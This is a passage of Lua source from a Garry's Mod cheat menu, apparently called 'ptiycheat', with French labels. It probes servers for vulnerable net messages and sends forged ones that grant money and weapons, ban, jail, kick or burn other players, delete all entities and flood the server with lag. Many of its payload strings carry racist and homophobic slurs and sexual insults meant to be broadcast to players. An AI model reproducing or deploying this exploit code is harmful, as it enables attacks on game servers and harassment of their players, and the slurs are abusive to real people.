net.WriteEntity(table.random(player.GetAll()):UserID())
net.WriteInt(3,3)
net.SendToServer()
end )
end

status = ValidNetString("InviteMember")
if (status) then
CHATPRINT("Exploit Trouvé : Inviter Tout Les Joueurs [InviteMember]")
addExploit( "176","Inviter Tout Les Joueurs", "Invite all players to your org", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("InviteMember")
net.WriteEntity(v)
net.WriteEntity(v)
net.WriteString("lol what")
net.SendToServer()
end
end )
end

status = ValidNetString("newTerritory")
if (status) then
CHATPRINT("Exploit Trouvé : Nouveau Territoire [newTerritory]")
addExploit( "177","Nouveau Territoire", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("newTerritory")
net.WriteString("Hackers")
net.WriteTable(t)
net.SendToServer()
end
end )
end

status = ValidNetString("CreateOrganization")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De Gang [CreateOrganization]")
addExploit( "178","Exploit De Gang", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("CreateOrganization")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString( "Join my gang or will rekt u" )
net.SendToServer()
end
end )
end

status = ValidNetString("DisbandOrganization")
if (status) then
CHATPRINT("Exploit Trouvé : Arreter L'Organisation [DisbandOrganization]")
addExploit( "179","Arreter L'Organisation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("DisbandOrganization")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("ChangeOrgName")
if (status) then
CHATPRINT("Exploit Trouvé : Changer Le Nom De L'Organisation [ChangeOrgName]")
addExploit( "180","Changer Le Nom De L'Organisation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ChangeOrgName")
net.WriteString("I LOVE BANNAS WOOOOOOOOO I FUCKED GIANT BABIES WOOOOOO")
net.WriteString("SHITTY CUNT ASS SERVER FUCK OFF. STOP WITH YOUR SHITTY COPY AND PASTE SHIT! YOU STOLE MY SHIT NIGGER!")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("IS_SubmitSID_C2S")
if (status) then
CHATPRINT("Exploit Trouvé : Cadeaux Gratuit [IS_SubmitSID_C2S | IS_GetReward_C2S]")
addExploit( "181","Cadeaux Gratuit", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("IS_SubmitSID_C2S")
net.WriteString("Killa")
net.SendToServer()
net.Start("IS_GetReward_C2S")
net.SendToServer()
end )
end

status = ValidNetString("AcceptBailOffer")
if (status) then
CHATPRINT("Exploit Trouvé : Offrir Des Cautions [AcceptBailOffer]")
addExploit( "182","Offrir Des Cautions", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("AcceptBailOffer")
net.WriteEntity(v)
net.WriteUInt(-100000000000000000, 16 )
net.SendToServer()
end
end )
end

status = ValidNetString("CP_Test_Results")
if (status) then
CHATPRINT("Exploit Trouvé : Devenir Policier [CP_Test_Results]")
addExploit( "183","Devenir Policier", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("CP_Test_Results")
net.WriteInt(1 ,8)
net.SendToServer()
end )
end

status = ValidNetString("ReSpawn")
if (status) then
CHATPRINT("Exploit Trouvé : ReSpawn #4 [ReSpawn]")
addExploit( "184","ReSpawn #4", "just reSpawn", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ReSpawn")
net.SendToServer()
end )
end

status = ValidNetString("FIGHTCLUB_KickPlayer")
if (status) then
CHATPRINT("Exploit Trouvé : Kick Du Fight Club [FIGHTCLUB_KickPlayer]")
addExploit( "185","Kick Du Fight Club", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("FIGHTCLUB_KickPlayer")
net.WriteBit(v)
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("FIGHTCLUB_StartFight")
if (status) then
CHATPRINT("Exploit Trouvé : Fight Club [FIGHTCLUB_StartFight]")
addExploit( "186","Fight Club Start Fight", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("FIGHTCLUB_StartFight")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("IveBeenRDMed")
if (status) then
CHATPRINT("Exploit Trouvé : Faux RDM [IveBeenRDMed]")
addExploit( "187","Faux RDM", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("IveBeenRDMed")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("nCTieUpStart")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit Des Combine Control [nCTieUpStart]")
addExploit( "188","Exploit Des Combine Control", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("nCTieUpStart")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end
end )
end

status = ValidNetString("DestroyTable")
if (status) then
CHATPRINT("Exploit Trouvé : Tout Détruire [DestroyTable]")
addExploit( "189","Tout Détruire", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("DestroyTable")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("start_wd_hack")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit Du Téléphone De H4x0r [start_wd_hack]")
addExploit( "190","Exploit Du Téléphone De H4x0r", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("start_wd_hack")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end )
end

status = ValidNetString("bringNfreeze")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De Bannissement [bringNfreeze]")
addExploit( "191","Exploit De Bannissement", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start('bringNfreeze')
net.WriteEntity(self)
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end
end )
end

status = ValidNetString("JoinFirstSS")
if (status) then
CHATPRINT("Exploit Trouvé : Rejoindre Les Premiers SS [JoinFirstSS]")
addExploit( "192","Rejoindre Les Premiers SS", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("JoinFirstSS")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("unarrestPerson")
if (status) then
CHATPRINT("Exploit Trouvé : Liberez De Prison [unarrestPerson]")
addExploit( "193","Liberez De Prison", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("unarrestPerson")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("giveArrestReason")
if (status) then
CHATPRINT("Exploit Trouvé : Donnez Une Raison D'Arrestation [giveArrestReason]")
addExploit( "194","Donnez Une Raison D'Arrestation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("giveArrestReason")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.WriteString("Faggot")
net.SendToServer()
end
end )
end

status = ValidNetString("sellitem")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #24 [sellitem]")
addExploit( "195","Argent Gratuite #24", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("sellitem")
net.WriteString(self)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("createFaction")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Un Gang [createFaction]")
addExploit( "196","Crée Un Gang", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("createFaction")
net.WriteEntity(v)
net.WriteString("I FUCKED SO MANY BABIES TODAY WOOOOOOOOOOOOOOOOOOOOOOOO")
net.SendToServer()
end
end )
end

status = ValidNetString("inviteToOrganization")
if (status) then
CHATPRINT("Exploit Trouvé : Inviter Tout Le Monde Dans Son Gang [inviteToOrganization]")
addExploit( "197","Inviter Tout Le Monde Dans Son Gang", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("inviteToOrganization")
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end

status = ValidNetString("GiveWeapon")
if (status) then
CHATPRINT("Exploit Trouvé : Donnez Des Armes #3 [GiveWeapon]")
addExploit( "199","Donnez Des Armes #3", "get weapons", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("GiveWeapon")
net.WriteEntity(LocalPlayer())
net.WriteString("m9k_davy_crockett")
net.WriteFloat(0)
net.SendToServer()
end )
end

status = ValidNetString("DailyLoginClaim")
if (status) then
CHATPRINT("Exploit Trouvé : Cadeau De Connexion [DailyLoginClaim]")
addExploit( "200","Cadeau De Connexion", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("DailyLoginClaim")
net.SendToServer()
end )
end

status = ValidNetString("DL_AskLogsList")
if (status) then
CHATPRINT("Exploit Trouvé : Voir La Listes Des Logs [DL_AskLogsList]")
addExploit( "201","Voir La Listes Des Logs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("DL_AskLogsList")
net.SendToServer()
end )
end

status = ValidNetString("DL_StartReport")
if (status) then
CHATPRINT("Exploit Trouvé : DL Report Tout Le Monde [DL_StartReport | DL_ReportPlayer]")
addExploit( "202","DL Report Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("DL_StartReport")
net.SendToServer()
net.Start("DL_ReportPlayer")
net.WriteEntity(v)
net.WriteString("Hes being a gay faggot plz ban him")
net.SendToServer()
end
end )
end

status = ValidNetString("sv_saveweapons")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit D'Arme TTT [sv_saveweapons]")
addExploit( "203","DL Report Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("sv_saveweapons")
net.WriteString("weapon_ttt_rpg")
net.WriteString("weapon_ttt_rpg")
net.WriteString("eg")
net.SendToServer()
end )
end

status = ValidNetString("SpecDM_SendLoadout")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De SpecDM [SpecDM_SendLoadout]")
addExploit( "204","Exploit De SpecDM", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("SpecDM_SendLoadout")
net.WriteString("eg")
net.WriteString("weapon_ttt_defib")
net.SendToServer()
end )
end

status = ValidNetString("PowerRoundsForcePR")
if (status) then
CHATPRINT("Exploit Trouvé : Forcer Un Power Round [PowerRoundsForcePR]")
addExploit( "205","Forcer Un Power Round", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("PowerRoundsForcePR")
net.SendToServer()
end )
end

status = ValidNetString("wyozimc_playply")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De Musique [wyozimc_playply]")
addExploit( "206","Exploit De Musique", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("wyozimc_playply")
net.WriteEntity(v)
net.WriteString("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
net.SendToServer()
end
end )
end

status = ValidNetString("SendSteamID")
if (status) then
CHATPRINT("Exploit Trouvé : Envoyez Mail's [SendSteamID]")
addExploit( "207","Envoyez Mail's", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("SendSteamID")
net.WriteEntity(v)
net.WriteString("Faggot")
net.WriteString("Faggot")
net.SendToServer()
end
end )
end

status = ValidNetString("JB_GiveCubics")
if (status) then
CHATPRINT("Exploit Trouvé : Donnez Des Cubes A Tout Le Monde [JB_GiveCubics]")
addExploit( "208","Donnez Des Cubes A Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("JB_GiveCubics")
net.WriteEntity(v)
net.WriteInt(math.floor(dwang:GetValue()), 255)
net.SendToServer()
end
end )
end

status = ValidNetString("JB_SelectWarden")
if (status) then
CHATPRINT("Exploit Trouvé : Warn Tout Le Monde [JB_SelectWarden]")
addExploit( "209","Warn Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("JB_SelectWarden")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("RDMReason_Explain")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit RDM [RDMReason_Explain]")
addExploit( "210","Exploit RDM", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("RDMReason_Explain")
net.WriteTable({id=v, reason=fgt})
net.SendToServer()
end
end )
end

status = ValidNetString("redirectMsg")
if (status) then
CHATPRINT("Exploit Trouvé : Message De Redirection [redirectMsg]")
addExploit( "211","Message De Redirection", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("redirectMsg")
net.WriteString("Seized By ptiycheat :c !")
net.SendToServer()
end )
end

status = ValidNetString("LB_AddBan")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit LB Ban [LB_AddBan]")
addExploit( "212","Exploit LB Ban", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("LB_AddBan")
net.WriteString("STEAM_0:0:71238382")
net.WriteString("fgt")
net.SendToServer()
end
end
end )
end

status = ValidNetString("GET_Admin_MSGS")
if (status) then
CHATPRINT("Exploit Trouvé : Défoncer Le Chat Admin [GET_Admin_MSGS | OPEN_ADMIN_CHAT]")
addExploit( "213","Défoncer Le Chat Admin", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("GET_Admin_MSGS")
net.SendToServer()
net.Start("OPEN_ADMIN_CHAT")
net.SendToServer()
end )
end

status = ValidNetString("br_send_pm")
if (status) then
CHATPRINT("Exploit Trouvé : Défoncer Les Email Envoyé A Tous [br_send_pm]")
addExploit( "214","Défoncer Les Email Envoyé A Tous", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("br_send_pm")
net.WriteString(v)
net.WriteString("FGT")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("LAWYER.BailFelonOut")
if (status) then
CHATPRINT("Exploit Trouvé : Libérer Prison [LAWYER.BailFelonOut]")
addExploit( "215","Libérer Prison", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("LAWYER.BailFelonOut")
net.WriteString("1")
net.WriteString("fgt")
net.SendToServer()
end )
end

status = ValidNetString("LAWYER.GetBailOut")
if (status) then
CHATPRINT("Exploit Trouvé : Libérer Prison [LAWYER.GetBailOut]")
addExploit( "216","Libérer Prison", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("LAWYER.GetBailOut")
net.WriteString("Mick")
net.WriteString("Mick")
net.WriteString("1000000")
net.SendToServer()
end )
end

status = ValidNetString("GrabMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Libérer Prison [GrabMoney]")
addExploit( "217","Libérer Prison", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "gold" then
if v:GetClass() == "silver" then
if v:GetClass() == "vip" then
if v:GetClass() == "vipgold" then
net.Start("GrabMoney")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end
end
end
end )
end

status = ValidNetString("nox_addpremadepunishment")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De Ban Nox  [nox_addpremadepunishment]")
addExploit( "218","Exploit De Ban Nox ", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("nox_addpremadepunishment")
net.WriteEntity("Sun")
net.WriteUInt(2, 8)
net.SendToServer()
end
end
end )
end

status = ValidNetString("NET_CR_TakeStoredMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argent Du Registre [NET_CR_TakeStoredMoney]")
addExploit( "219","Voler L'argent Du Registre", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "ss_cash_registry" then
net.Start('NET_CR_TakeStoredMoney')
net.WriteEntity("ss_cash_registry")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end )
end

status = ValidNetString("HV_AmmoBuy")
if (status) then
CHATPRINT("Exploit Trouvé : HV Munitions Gratuites [HV_AmmoBuy]")
addExploit( "220","HV Munitions Gratuites", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("HV_AmmoBuy")
net.WriteFloat("2")
net.SendToServer()
net.Start("HV_AmmoBuy")
net.WriteFloat("1")
net.SendToServer()
end )
end

status = ValidNetString("hitcomplete")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite [hitcomplete]")
addExploit( "221","Argent Gratuite", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("hitcomplete")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("SyncRemoveAction")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Tout [SyncRemoveAction]")
addExploit( "222","Supprimer Tout", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("SyncRemoveAction")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("TMC_NET_MakePlayerWanted")
if (status) then
CHATPRINT("Exploit Trouvé : Mettre Un Avis De Recherche Global [TMC_NET_MakePlayerWanted]")
addExploit( "223","Mettre Un Avis De Recherche Global", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("TMC_NET_MakePlayerWanted")
net.WriteString("bad")
net.WriteString("bad")
net.SendToServer()
end
end )
end

status = ValidNetString("thiefnpc")
if (status) then
CHATPRINT("Exploit Trouvé : NPC De Voleur [thiefnpc]")
addExploit( "224","NPC De Voleur", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start('thiefnpc')
net.WriteDouble(-99999999999999999)
net.SendToServer()
end )
end

status = ValidNetString("TMC_NET_FirePlayer")
if (status) then
CHATPRINT("Exploit Trouvé : Brûler Des Joueurs [TMC_NET_FirePlayer]")
addExploit( "225","Brûler Des Joueurs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("TMC_NET_FirePlayer")
net.WriteString("Paypal")
net.SendToServer()
end )
end

status = ValidNetString("updateLaws")
if (status) then
CHATPRINT("Exploit Trouvé : Mettre A Jours Les Lois [updateLaws]")
addExploit( "226","Mettre A Jours Les Lois", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("updateLaws")
net.WriteString("Bitch")
net.SendToServer()
end )
end

status = ValidNetString("LotteryMenu")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #25 [LotteryMenu]")
addExploit( "227","Argent Gratuite #25", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("LotteryMenu")
net.WriteEntity(LocalPlayer())
net.WriteInt(1000000000000000000, 16)
net.SendToServer()
end )
end

status = ValidNetString("soundArrestCommit")
if (status) then
CHATPRINT("Exploit Trouvé : Bruit D'Arrestation [soundArrestCommit]")
addExploit( "228","Bruit D'Arrestation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("soundArrestCommit")
net.WriteString("Shit")
net.SendToServer()
end )
end

status = ValidNetString("hoverboardpurchase")
if (status) then
CHATPRINT("Exploit Trouvé : Hover Board [hoverboardpurchase]")
addExploit( "229","Hover Board", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("hoverboardpurchase")
net.WriteInt(8, 32)
net.SendToServer()
end )
end

status = ValidNetString("NPCShop_BuyItem")
if (status) then
CHATPRINT("Exploit Trouvé : NPC Magasin [NPCShop_BuyItem]")
addExploit( "231","NPC Shop", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("NPCShop_BuyItem")
net.WriteString("weapon_hack_phone")
net.SendToServer()
end )
end

status = ValidNetString("CubeRiot CaptureZone Update")
if (status) then
CHATPRINT("Exploit Trouvé : CubeRiot Exploit [CubeRiot CaptureZone Update]")
addExploit( "232","CubeRiot Exploit", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("CubeRiot CaptureZone Update")
net.WriteUInt( 1, 8 )
net.WriteVector( "2654.989258 2254.119629 -139.968750" )
net.WriteVector( "2654.989258 2254.119629 -139.968750" )
net.SendToServer()
end )
end

status = ValidNetString("deposit")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #26 [deposit]")
addExploit( "233","Argent Gratuite #26", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("deposit")
net.WriteString("-10000000000000000000000")
net.SendToServer()
end )
end

status = ValidNetString("AcceptRequest")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit D'Appel [AcceptRequest]")
addExploit( "234","Exploit D'Appel", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("AcceptRequest")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("Chess ClientWager")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit Des Dames [Chess ClientWager | Chess ClientResign]")
addExploit( "235","Exploit Des Dames", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Chess ClientWager")
net.WriteUInt( -999999999999999999999999999, 24 )
net.SendToServer()
net.Start("Chess ClientResign")
net.SendToServer()
end )
end

status = ValidNetString("netOrgVoteInvite_Server")
if (status) then
CHATPRINT("Exploit Trouvé : Invitez Tout Le Monde Dans Son Gang [netOrgVoteInvite_Server]")
addExploit( "236","Invitez Tout Le Monde Dans Son Gang", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("netOrgVoteInvite_Server")
net.WriteEntity(v)
net.SendToServer()
end
end )
end


status = ValidNetString("donatorshop_itemtobuy")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De La Boite Des Donateur [donatorshop_itemtobuy]")
addExploit( "237","Exploit De La Boite Des Donateur", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("donatorshop_itemtobuy")
net.WriteString("DonatorShopBuyTripwire")
net.SendToServer()
end )
end

status = ValidNetString("AskPickupItemInv")
if (status) then
CHATPRINT("Exploit Trouvé : Demandez Items [AskPickupItemInv]")
addExploit( "238","Demandez Items", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("AskPickupItemInv")
net.WriteUInt(4,16)
net.WriteUInt(1,16)
net.SendToServer()
end
end )
end

status = ValidNetString("buy_bundle")
if (status) then
CHATPRINT("Exploit Trouvé : Achetez Bundle [buy_bundle]")
addExploit( "239","Achetez Bundle", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("buy_bundle")
net.WriteFloat(1, 16)
net.SendToServer()
end )
end

status = ValidNetString("LawyerOfferBail")
if (status) then
CHATPRINT("Exploit Trouvé : Sortir De Prison [LawyerOfferBail | AcceptBailOffer]")
addExploit( "240","Sortir De Prison", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("LawyerOfferBail")
net.WriteEntity(v)
net.WriteUInt(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
net.Start("AcceptBailOffer")
net.WriteEntity(v)
net.WriteUInt(-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
end
end )
end

status = ValidNetString("MineServer")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #22 [MineServer]")
addExploit( "241","Crée Des Lags #22", "lags", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for i = 0, 100 do
for k,v in pairs(player.GetAll()) do
net.Start("MineServer",true)
net.WriteString("sell")
net.WriteEntity(v)
net.WriteString("Fuck you. Gonna ddos this shitty ass server niggers")
net.SendToServer()
end
end
end )
end

status = ValidNetString("Gb_gasstation_BuyGas")
if (status) then
CHATPRINT("Exploit Trouvé : Gaz Ukrainien [Gb_gasstation_BuyGas | Gb_gasstation_BuyJerrycan]")
addExploit( "242","Gaz Ukrainien", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Gb_gasstation_BuyGas")
net.SendToServer()
net.Start("Gb_gasstation_BuyJerrycan")
net.SendToServer()
end )
end

status = ValidNetString("D3A_CreateOrg")
if (status) then
CHATPRINT("Exploit Trouvé : D3A Crée une Organisation [D3A_CreateOrg]")
addExploit( "243","D3A Crée une Organisation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("D3A_CreateOrg")
net.WriteString('969690485273489312467812367128312312314')
net.WriteString('123712983712984571298712398')
net.WriteString("255 255 255")
net.SendToServer()
end )
end

status = ValidNetString("Shop_buy")
if (status) then
CHATPRINT("Exploit Trouvé : SUP Buy Armor [Shop_buy]")
addExploit( "244","SUP Buy Armor", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Shop_buy")
net.WriteString("Armor")
net.SendToServer()
end )
end

status = ValidNetString("LawsToServer")
if (status) then
CHATPRINT("Exploit Trouvé : SUP Nouvelles Lois [LawsToServer]")
addExploit( "245","SUP Nouvelles Lois", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("LawsToServer")
net.WriteString("FAGGOTS")
net.SendToServer()
end )
end

status = ValidNetString("D3A_Message")
if (status) then
CHATPRINT("Exploit Trouvé : D3A Message [D3A_Message]")
addExploit( "246","D3A Message", "", function()
